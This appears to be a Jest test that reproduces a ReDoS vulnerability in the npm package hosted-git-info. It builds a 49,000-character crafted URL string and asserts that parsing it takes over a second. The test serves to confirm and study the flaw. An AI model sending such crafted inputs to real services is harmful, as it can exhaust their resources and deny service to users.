test("ReDos in hosted-git-info", () => {
  const genstr = require("../utils").genstr;
  const measureTime = require("../utils").measureTime;
  const hostedGitInfo = require("hosted-git-info");
  var attack_str = "a:" + genstr(49000, "a") + "!";
  let t = measureTime(function () {
    var parsedInfo = hostedGitInfo.fromUrl(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
